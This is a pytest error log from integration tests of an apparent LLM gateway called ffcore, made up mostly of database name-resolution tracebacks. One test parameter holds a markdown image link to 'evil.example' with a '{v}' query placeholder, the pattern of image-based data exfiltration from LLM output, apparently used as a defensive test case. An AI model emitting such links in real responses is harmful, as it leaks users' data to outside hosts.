+params = {'host': 'postgres', 'dbname': 'ffcore_test_810981bcb86c', 'user': 'ffcore', 'password': 'dummy-not-secret-postgres', ...}
+
+    async def conninfo_attempts_async(params: ConnMapping) -> list[ConnDict]:
+        """Split a set of connection params on the single attempts to perform.
+    
+        A connection param can perform more than one attempt more than one ``host``
+        is provided.
+    
+        Also perform async resolution of the hostname into hostaddr. Because a host
+        can resolve to more than one address, this can lead to yield more attempts
+        too. Raise `OperationalError` if no host could be resolved.
+    
+        Because the libpq async function doesn't honour the timeout, we need to
+        reimplement the repeated attempts.
+        """
+        last_exc = None
+        attempts = []
+        if prefer_standby := get_param(params, "target_session_attrs") == "prefer-standby":
+            params = {k: v for k, v in params.items() if k != "target_session_attrs"}
+    
+        for attempt in split_attempts(params):
+            try:
+                attempts.extend(await _resolve_hostnames(attempt))
+            except OSError as ex:
+                last_exc = e.OperationalError(
+                    f"failed to resolve host {attempt.get('host')!r}: {ex}"
+                )
+                logger.debug("%s", last_exc)
+    
+        if not attempts:
+            assert last_exc
+            # We couldn't resolve anything
+>           raise last_exc
+E           psycopg.OperationalError: failed to resolve host 'postgres': [Errno -3] Temporary failure in name resolution
+
+/opt/venv/lib/python3.12/site-packages/psycopg/_conninfo_attempts_async.py:53: OperationalError
+
+The above exception was the direct cause of the following exception:
+
+database_url = 'postgresql+psycopg://ffcore:dummy-not-secret-postgres@postgres:5432/ffcore_test_810981bcb86c'
+pg = <psycopg.Connection [IDLE] (host=postgres user=ffcore database=ffcore_test_810981bcb86c) at 0x7fec5bee7290>
+catalog = <tests.integration.litellm_support.catalog.<locals>.Catalog object at 0x7feccc4a98b0>
+facade_settings = Settings(deploy_profile='llmaas', inference_backend='ollama', offline=False, database_url=SecretStr('**********'), ser...flush_s=60, retention_dry_run=True, retention_audit_drop_enabled=False, retention_batch=5000, alert_service_down_s=300)
+make_user = <function make_user.<locals>.make at 0x7fec69606f20>
+client_factory = <function client_factory.<locals>.make at 0x7fec69606d40>
+facade = <function facade.<locals>.make at 0x7fec5bca3d80>
+
+    @pytest.fixture
+    def direct(database_url, pg, catalog, facade_settings, make_user, client_factory, facade):
+        """A project with `chat-default` (fake `ok-model`) and `tooly` (fake `tool-model`), an admin
+        console and a chat_direct key."""
+        project = catalog.project()
+        provider = catalog.provider([project])
+        catalog.model(project, provider, key="chat-default", model_id="ok-model")
+        catalog.model(project, provider, key="tooly", model_id="tool-model")
+        run_reconcile(database_url, facade_settings)
+        # run_reconcile resets the database module; the app uses the test database again.
+        from ffcore.core import db
+    
+        db.configure(database_url, pooled=False)
+        _, email = make_user(memberships={project: ("admin", "edit")})
+>       console = client_factory(email)
+                  ^^^^^^^^^^^^^^^^^^^^^
+
+tests/integration/test_06b_direct.py:67: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+tests/integration/conftest.py:206: in make
+    response = client.post(
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:1203: in post
+    return self.request(
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:518: in request
+    return super().request(
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:796: in request
+    return self.send(request, auth=auth, follow_redirects=follow_redirects)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:993: in send
+    raise exc
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:987: in send
+    response.read()
+/opt/venv/lib/python3.12/site-packages/httpx2/_models.py:877: in read
+    self._content = b"".join(self.iter_bytes())
+                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpx2/_models.py:893: in iter_bytes
+    for raw_bytes in self.iter_raw():
+                     ^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpx2/_models.py:948: in iter_raw
+    for raw_stream_bytes in self.stream:
+                            ^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:143: in __iter__
+    yield from self._stream
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:384: in iter_body
+    exit_stack.close()
+/usr/local/lib/python3.12/contextlib.py:618: in close
+    self.__exit__(None, None, None)
+/usr/local/lib/python3.12/contextlib.py:610: in __exit__
+    raise exc_details[1]
+/usr/local/lib/python3.12/contextlib.py:595: in __exit__
+    if cb(*exc_details):
+       ^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:399: in close_app
+    raise exception
+/opt/venv/lib/python3.12/site-packages/anyio/from_thread.py:265: in _call_func
+    retval = await retval_or_awaitable
+             ^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:366: in run_app
+    await self.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/applications.py:1194: in __call__
+    await super().__call__(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/applications.py:96: in __call__
+    await self.middleware_stack(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/middleware/errors.py:186: in __call__
+    raise exc
+/opt/venv/lib/python3.12/site-packages/starlette/middleware/errors.py:164: in __call__
+    await self.app(scope, receive, _send)
+/opt/venv/lib/python3.12/site-packages/fastapi/telemetry/_asgi.py:151: in __call__
+    await self.app(scope, receive, send)
+ffcore/core/logging.py:261: in __call__
+    await self.app(scope, receive, send_status)
+ffcore/api/upload_limit.py:44: in __call__
+    await self.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/middleware/exceptions.py:63: in __call__
+    await wrap_app_handling_exceptions(self.app, conn)(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/_exception_handler.py:53: in wrapped_app
+    raise exc
+/opt/venv/lib/python3.12/site-packages/starlette/_exception_handler.py:42: in wrapped_app
+    await app(scope, receive, sender)
+/opt/venv/lib/python3.12/site-packages/fastapi/middleware/asyncexitstack.py:18: in __call__
+    await self.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/routing.py:683: in __call__
+    await self.middleware_stack(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:2811: in app
+    await route.handle(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:1839: in handle
+    await self.original_router.handle(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:2894: in handle
+    await included_router._handle_selected(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:1850: in _handle_selected
+    await route.handle(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:1839: in handle
+    await self.original_router.handle(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:2894: in handle
+    await included_router._handle_selected(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:1865: in _handle_selected
+    await original_route.handle(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:1328: in handle
+    await effective_context.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:166: in app
+    await wrap_app_handling_exceptions(app, request)(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/_exception_handler.py:53: in wrapped_app
+    raise exc
+/opt/venv/lib/python3.12/site-packages/starlette/_exception_handler.py:42: in wrapped_app
+    await app(scope, receive, sender)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:152: in app
+    response = await f(request)
+               ^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:745: in app
+    raw_response = await run_endpoint_function(
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:372: in run_endpoint_function
+    return await dependant.call(**values)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+ffcore/api/auth.py:144: in login
+    return await me_payload(session, user)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+ffcore/api/auth.py:76: in me_payload
+    for pid, key, role, access in await session.execute(query)
+                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/ext/asyncio/session.py:651: in execute
+    result = await greenlet_spawn(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:210: in greenlet_spawn
+    result = context.throw(*sys.exc_info())
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:2473: in execute
+    return self._execute_internal(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:2350: in _execute_internal
+    conn = self._connection_for_bind(bind)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:2173: in _connection_for_bind
+    return trans._connection_for_bind(engine, execution_options)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/state_changes.py:137: in _go
+    ret_value = fn(self, *arg, **kw)
+                ^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:1203: in _connection_for_bind
+    conn = bind.connect()
+           ^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:3275: in connect
+    return self._connection_cls(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:151: in __init__
+    Connection._handle_dbapi_exception_noconnection(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:2432: in _handle_dbapi_exception_noconnection
+    raise sqlalchemy_exception.with_traceback(exc_info[2]) from e
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:149: in __init__
+    self._dbapi_connection = engine.raw_connection()
+                             ^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:3299: in raw_connection
+    return self.pool.connect()
+           ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:445: in connect
+    return _ConnectionFairy._checkout(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:1324: in _checkout
+    fairy = _ConnectionRecord.checkout(pool)
+            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:709: in checkout
+    rec = pool._do_get()
+          ^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/impl.py:301: in _do_get
+    return self._create_connection()
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:386: in _create_connection
+    return _ConnectionRecord(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:671: in __init__
+    self.__connect()
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:916: in __connect
+    with util.safe_reraise():
+         ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/langhelpers.py:166: in __exit__
+    raise exc_value.with_traceback(exc_tb)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:912: in __connect
+    self.dbapi_connection = connection = pool._invoke_creator(self)
+                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/create.py:645: in connect
+    return dialect.connect(*cargs_tup, **cparams)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/default.py:869: in connect
+    return self.loaded_dbapi.connect(*cargs, **cparams)  # type: ignore[no-any-return]  # NOQA: E501
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/dialects/postgresql/psycopg.py:760: in connect
+    return await_(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:167: in await_
+    return current.parent.switch(awaitable)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:205: in greenlet_spawn
+    value = await result
+            ^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:378: in create
+    cls._handle_exception_no_connection(dbapi, error)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:409: in _handle_exception_no_connection
+    raise error.with_traceback(exc_info[2])
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:376: in create
+    connection = await connection_awaitable
+                 ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/psycopg/connection_async.py:116: in connect
+    attempts = await conninfo_attempts_async(params)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+params = {'host': 'postgres', 'dbname': 'ffcore_test_810981bcb86c', 'user': 'ffcore', 'password': 'dummy-not-secret-postgres', ...}
+
+    async def conninfo_attempts_async(params: ConnMapping) -> list[ConnDict]:
+        """Split a set of connection params on the single attempts to perform.
+    
+        A connection param can perform more than one attempt more than one ``host``
+        is provided.
+    
+        Also perform async resolution of the hostname into hostaddr. Because a host
+        can resolve to more than one address, this can lead to yield more attempts
+        too. Raise `OperationalError` if no host could be resolved.
+    
+        Because the libpq async function doesn't honour the timeout, we need to
+        reimplement the repeated attempts.
+        """
+        last_exc = None
+        attempts = []
+        if prefer_standby := get_param(params, "target_session_attrs") == "prefer-standby":
+            params = {k: v for k, v in params.items() if k != "target_session_attrs"}
+    
+        for attempt in split_attempts(params):
+            try:
+                attempts.extend(await _resolve_hostnames(attempt))
+            except OSError as ex:
+                last_exc = e.OperationalError(
+                    f"failed to resolve host {attempt.get('host')!r}: {ex}"
+                )
+                logger.debug("%s", last_exc)
+    
+        if not attempts:
+            assert last_exc
+            # We couldn't resolve anything
+>           raise last_exc
+E           sqlalchemy.exc.OperationalError: (psycopg.OperationalError) failed to resolve host 'postgres': [Errno -3] Temporary failure in name resolution
+E           (Background on this error at: https://sqlalche.me/e/21/e3q8)
+
+/opt/venv/lib/python3.12/site-packages/psycopg/_conninfo_attempts_async.py:53: OperationalError
+---------------------------- Captured stderr setup -----------------------------
+2026-11-05 01:48:56,774 INFO ffcore.litellm_reconcile litellm_reconciled created=2 updated=0 deleted=0 problems=0
+2026-11-05 01:48:57,083 ERROR ffcore.readiness warmup failed: ModelMissing
+2026-11-05 01:49:08,053 INFO ffcore.access access method=POST path=/api/v1/auth/login status=500 ms=10965
+------------------------------ Captured log setup ------------------------------
+INFO     ffcore.litellm_reconcile:litellm_reconcile.py:372 litellm_reconciled created=2 updated=0 deleted=0 problems=0
+ERROR    ffcore.readiness:readiness.py:63 warmup failed: ModelMissing
+INFO     ffcore.access:logging.py:263 access method=POST path=/api/v1/auth/login status=500 ms=10965
+_ ERROR at setup of test_08t_r2_direct_url_lines_keep_the_placeholder[![x](<https://evil.example/a b?q= {v}>)] _
+
+self = <sqlalchemy.engine.base.Connection object at 0x7fec6dd17950>
+engine = Engine(postgresql+psycopg://ffcore:***@postgres:5432/ffcore_test_810981bcb86c)
+connection = None, _has_events = None, _allow_revalidate = True
+_allow_autobegin = True
+
+    def __init__(
+        self,
+        engine: Engine,
+        connection: Optional[PoolProxiedConnection] = None,
+        _has_events: Optional[bool] = None,
+        _allow_revalidate: bool = True,
+        _allow_autobegin: bool = True,
+    ):
+        """Construct a new Connection."""
+        self.engine = engine
+        self.dialect = dialect = engine.dialect
+    
+        if connection is None:
+            try:
+>               self._dbapi_connection = engine.raw_connection()
+                                         ^^^^^^^^^^^^^^^^^^^^^^^
+
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:149: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:3299: in raw_connection
+    return self.pool.connect()
+           ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:445: in connect
+    return _ConnectionFairy._checkout(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:1324: in _checkout
+    fairy = _ConnectionRecord.checkout(pool)
+            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:709: in checkout
+    rec = pool._do_get()
+          ^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/impl.py:301: in _do_get
+    return self._create_connection()
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:386: in _create_connection
+    return _ConnectionRecord(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:671: in __init__
+    self.__connect()
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:916: in __connect
+    with util.safe_reraise():
+         ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/langhelpers.py:166: in __exit__
+    raise exc_value.with_traceback(exc_tb)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:912: in __connect
+    self.dbapi_connection = connection = pool._invoke_creator(self)
+                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/create.py:645: in connect
+    return dialect.connect(*cargs_tup, **cparams)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/default.py:869: in connect
+    return self.loaded_dbapi.connect(*cargs, **cparams)  # type: ignore[no-any-return]  # NOQA: E501
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/dialects/postgresql/psycopg.py:760: in connect
+    return await_(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:167: in await_
+    return current.parent.switch(awaitable)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:205: in greenlet_spawn
+    value = await result
+            ^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:378: in create
+    cls._handle_exception_no_connection(dbapi, error)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:409: in _handle_exception_no_connection
+    raise error.with_traceback(exc_info[2])
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:376: in create
+    connection = await connection_awaitable
+                 ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/psycopg/connection_async.py:116: in connect
+    attempts = await conninfo_attempts_async(params)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+params = {'host': 'postgres', 'dbname': 'ffcore_test_810981bcb86c', 'user': 'ffcore', 'password': 'dummy-not-secret-postgres', ...}
+
+    async def conninfo_attempts_async(params: ConnMapping) -> list[ConnDict]:
+        """Split a set of connection params on the single attempts to perform.
+    
+        A connection param can perform more than one attempt more than one ``host``
+        is provided.
+    
+        Also perform async resolution of the hostname into hostaddr. Because a host
+        can resolve to more than one address, this can lead to yield more attempts
+        too. Raise `OperationalError` if no host could be resolved.
+    
+        Because the libpq async function doesn't honour the timeout, we need to
+        reimplement the repeated attempts.
+        """
+        last_exc = None
+        attempts = []
+        if prefer_standby := get_param(params, "target_session_attrs") == "prefer-standby":
+            params = {k: v for k, v in params.items() if k != "target_session_attrs"}
+    
+        for attempt in split_attempts(params):
+            try:
+                attempts.extend(await _resolve_hostnames(attempt))
+            except OSError as ex:
+                last_exc = e.OperationalError(
+                    f"failed to resolve host {attempt.get('host')!r}: {ex}"
+                )
+                logger.debug("%s", last_exc)
+    
+        if not attempts:
+            assert last_exc
+            # We couldn't resolve anything
+>           raise last_exc
+E           psycopg.OperationalError: failed to resolve host 'postgres': [Errno -3] Temporary failure in name resolution
+
+/opt/venv/lib/python3.12/site-packages/psycopg/_conninfo_attempts_async.py:53: OperationalError
+
+The above exception was the direct cause of the following exception:
+
+database_url = 'postgresql+psycopg://ffcore:dummy-not-secret-postgres@postgres:5432/ffcore_test_810981bcb86c'
+pg = <psycopg.Connection [IDLE] (host=postgres user=ffcore database=ffcore_test_810981bcb86c) at 0x7fec6dcc7410>
+catalog = <tests.integration.litellm_support.catalog.<locals>.Catalog object at 0x7fec8c2b3830>
+facade_settings = Settings(deploy_profile='llmaas', inference_backend='ollama', offline=False, database_url=SecretStr('**********'), ser...flush_s=60, retention_dry_run=True, retention_audit_drop_enabled=False, retention_batch=5000, alert_service_down_s=300)
+make_user = <function make_user.<locals>.make at 0x7fec60632660>
+client_factory = <function client_factory.<locals>.make at 0x7fec60632fc0>
+facade = <function facade.<locals>.make at 0x7fec776d9440>
+
+    @pytest.fixture
+    def direct(database_url, pg, catalog, facade_settings, make_user, client_factory, facade):
+        """A project with `chat-default` (fake `ok-model`) and `tooly` (fake `tool-model`), an admin
+        console and a chat_direct key."""
+        project = catalog.project()
+        provider = catalog.provider([project])
+        catalog.model(project, provider, key="chat-default", model_id="ok-model")
+        catalog.model(project, provider, key="tooly", model_id="tool-model")
+        run_reconcile(database_url, facade_settings)
+        # run_reconcile resets the database module; the app uses the test database again.
+        from ffcore.core import db
+    
+        db.configure(database_url, pooled=False)
+        _, email = make_user(memberships={project: ("admin", "edit")})
+>       console = client_factory(email)
+                  ^^^^^^^^^^^^^^^^^^^^^
+
+tests/integration/test_06b_direct.py:67: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+tests/integration/conftest.py:203: in make
+    client.__enter__()
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:572: in __enter__
+    portal.call(self.wait_startup)
+/opt/venv/lib/python3.12/site-packages/anyio/from_thread.py:340: in call
+    return cast(T_Retval, self.start_task_soon(func, *args).result())
+                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/concurrent/futures/_base.py:456: in result
+    return self.__get_result()
+           ^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/concurrent/futures/_base.py:401: in __get_result
+    raise self._exception
+/opt/venv/lib/python3.12/site-packages/anyio/from_thread.py:265: in _call_func
+    retval = await retval_or_awaitable
+             ^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:608: in wait_startup
+    await receive()
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:599: in receive
+    self.task.result()
+/usr/local/lib/python3.12/concurrent/futures/_base.py:449: in result
+    return self.__get_result()
+           ^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/concurrent/futures/_base.py:401: in __get_result
+    raise self._exception
+/opt/venv/lib/python3.12/site-packages/anyio/from_thread.py:265: in _call_func
+    retval = await retval_or_awaitable
+             ^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:589: in lifespan
+    await self.app(scope, self.stream_receive.receive, self.stream_send.send)
+/opt/venv/lib/python3.12/site-packages/fastapi/applications.py:1181: in __call__
+    await lifespan(
+/opt/venv/lib/python3.12/site-packages/fastapi/telemetry/_runtime.py:238: in lifespan
+    await app(scope, wrapped_receive, wrapped_send)
+/opt/venv/lib/python3.12/site-packages/starlette/applications.py:96: in __call__
+    await self.middleware_stack(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/middleware/errors.py:151: in __call__
+    await self.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/telemetry/_asgi.py:151: in __call__
+    await self.app(scope, receive, send)
+ffcore/core/logging.py:250: in __call__
+    await self.app(scope, receive, send)
+ffcore/api/upload_limit.py:44: in __call__
+    await self.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/middleware/exceptions.py:49: in __call__
+    await self.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/middleware/asyncexitstack.py:18: in __call__
+    await self.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/routing.py:683: in __call__
+    await self.middleware_stack(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:2798: in app
+    await self.lifespan(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/routing.py:661: in lifespan
+    async with self.lifespan_context(app) as maybe_state:
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/contextlib.py:210: in __aenter__
+    return await anext(self.gen)
+           ^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:248: in merged_lifespan
+    async with original_context(app) as maybe_original_state:
+               ^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/contextlib.py:210: in __aenter__
+    return await anext(self.gen)
+           ^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:248: in merged_lifespan
+    async with original_context(app) as maybe_original_state:
+               ^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/contextlib.py:210: in __aenter__
+    return await anext(self.gen)
+           ^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:248: in merged_lifespan
+    async with original_context(app) as maybe_original_state:
+               ^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/contextlib.py:210: in __aenter__
+    return await anext(self.gen)
+           ^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:248: in merged_lifespan
+    async with original_context(app) as maybe_original_state:
+               ^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/contextlib.py:210: in __aenter__
+    return await anext(self.gen)
+           ^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:248: in merged_lifespan
+    async with original_context(app) as maybe_original_state:
+               ^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/contextlib.py:210: in __aenter__
+    return await anext(self.gen)
+           ^^^^^^^^^^^^^^^^^^^^^
+ffcore/main.py:54: in lifespan
+    await ensure_audit_partitions(2)
+ffcore/core/audit.py:336: in ensure_audit_partitions
+    result = await session.execute(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/ext/asyncio/session.py:651: in execute
+    result = await greenlet_spawn(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:210: in greenlet_spawn
+    result = context.throw(*sys.exc_info())
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:2473: in execute
+    return self._execute_internal(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:2350: in _execute_internal
+    conn = self._connection_for_bind(bind)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:2173: in _connection_for_bind
+    return trans._connection_for_bind(engine, execution_options)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/state_changes.py:137: in _go
+    ret_value = fn(self, *arg, **kw)
+                ^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:1203: in _connection_for_bind
+    conn = bind.connect()
+           ^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:3275: in connect
+    return self._connection_cls(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:151: in __init__
+    Connection._handle_dbapi_exception_noconnection(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:2432: in _handle_dbapi_exception_noconnection
+    raise sqlalchemy_exception.with_traceback(exc_info[2]) from e
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:149: in __init__
+    self._dbapi_connection = engine.raw_connection()
+                             ^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:3299: in raw_connection
+    return self.pool.connect()
